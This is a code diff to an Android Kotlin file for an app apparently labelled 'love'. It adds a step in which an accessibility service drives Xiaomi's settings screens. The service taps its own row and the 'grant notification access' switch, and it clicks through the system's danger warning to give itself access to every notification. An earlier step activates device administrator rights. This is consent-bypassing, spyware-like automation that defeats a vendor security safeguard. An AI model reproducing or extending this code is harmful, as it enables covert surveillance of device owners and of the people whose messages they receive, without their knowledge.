@@ -46,7 +46,9 @@ object MiuiFlow : VendorFlow {
                 Log.w(TAG, "step1 未拿到全部权限，仍继续尝试设备管理")
             }
             step2_设备管理(service) { active ->
-                step3_收尾(active)
+                step3_通知使用权(service) { granted ->
+                    step4_收尾(active, granted)
+                }
             }
         }
     }
@@ -121,10 +123,84 @@ object MiuiFlow : VendorFlow {
         ui.postDelayed({ watch() }, 4_000L)
     }
 
-    // ───────────────────────── 第 3 步：收尾 ─────────────────────────
+    // ─────────────────── 第 3 步：通知使用权（小米同款入口） ───────────────────
 
-    private fun step3_收尾(adminActive: Boolean) {
-        Log.d(TAG, "step3: 管理员激活=$adminActive -> 结束（通知/电池未启用）")
+    /**
+     * 小米的通知使用权入口：`ACTION_NOTIFICATION_LISTENER_SETTINGS`
+     *   列表页（NotificationAccessSettingsActivity）→ 点「love」这一行
+     *   → 详情页（NotificationAccessDetails）→ 点「授予通知使用权」开关
+     *   → 若弹「危险」页 → 等 2 秒勾选 → 10 秒点确定
+     *   → 校验 enabled_notification_listeners 是否包含本应用（系统有 ~10 秒绑定延迟）
+     */
+    private fun step3_通知使用权(service: BoundaryAccessibilityService, done: (Boolean) -> Unit) {
+        if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
+            Log.d(TAG, "step3: 通知使用权已授权，跳过")
+            done(true); return
+        }
+        Log.d(TAG, "step3: 打开通知使用权设置页")
+        var navTries = 0
+        fun openPage() {
+            runCatching {
+                service.startActivity(
+                    Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                )
+            }.onFailure { Log.w(TAG, "step3: 打开设置页失败 $it") }
+            if (++navTries < 4) ui.postDelayed({
+                if (!com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service) &&
+                    !isListOrDetail(service)) openPage()
+            }, 2_000L)
+        }
+        openPage()
+
+        // 列表页点自己那一行 → 详情页点开关 → 危险页 → 等待系统绑定
+        var ticks = 0
+        var rowClicked = false
+        var toggleClicked = false
+        fun drive() {
+            if (com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)) {
+                Log.d(TAG, "step3: 已授权")
+                done(true); return
+            }
+            // 危险页优先处理
+            if (MiuiNavigator.onRiskDialog(service)) {
+                Log.d(TAG, "step3: 出现危险页 -> 处理")
+                MiuiNavigator.passRiskDialog(service) { ok -> Log.d(TAG, "step3: 危险页=$ok") }
+            } else if (!rowClicked) {
+                val hit = MiuiNavigator.clickByText(service, appLabel(service), contains = false)
+                if (hit) { rowClicked = true; Log.d(TAG, "step3: 点到自己那一行") }
+            } else if (!toggleClicked) {
+                var hit = false
+                for (t in MiuiNavigator.NOTI_ACCESS_TEXTS) {
+                    if (MiuiNavigator.clickByText(service, t, contains = true)) { hit = true; break }
+                }
+                if (!hit) hit = MiuiNavigator.clickAppSwitch(service)
+                if (hit) { toggleClicked = true; Log.d(TAG, "step3: 点了允许开关") }
+            }
+            if (ticks++ > 40) {                       // ≈ 60 秒
+                val g = com.zaka.screenagent.notify.NotificationAccessActivator.isGranted(service)
+                Log.w(TAG, "step3: 超时 granted=$g")
+                done(g); return
+            }
+            ui.postDelayed({ drive() }, 1_500L)
+        }
+        ui.postDelayed({ drive() }, 4_000L)
+    }
+
+    private fun isListOrDetail(service: BoundaryAccessibilityService): Boolean {
+        val cls = runCatching { service.rootInActiveWindow?.className?.toString().orEmpty() }.getOrDefault("")
+        return cls.contains("NotificationAccess") || cls.contains("SubSettings")
+    }
+
+    private fun appLabel(service: BoundaryAccessibilityService): String =
+        runCatching {
+            service.packageManager.getApplicationLabel(service.applicationInfo).toString()
+        }.getOrDefault("love")
+
+    // ───────────────────────── 第 4 步：收尾 ─────────────────────────
+
+    private fun step4_收尾(adminActive: Boolean, notiGranted: Boolean) {
+        Log.d(TAG, "step4: 管理员=$adminActive 通知使用权=$notiGranted -> 结束（电池未接）")
         Log.d(TAG, "===== MIUI 引导结束 =====")
     }
 }
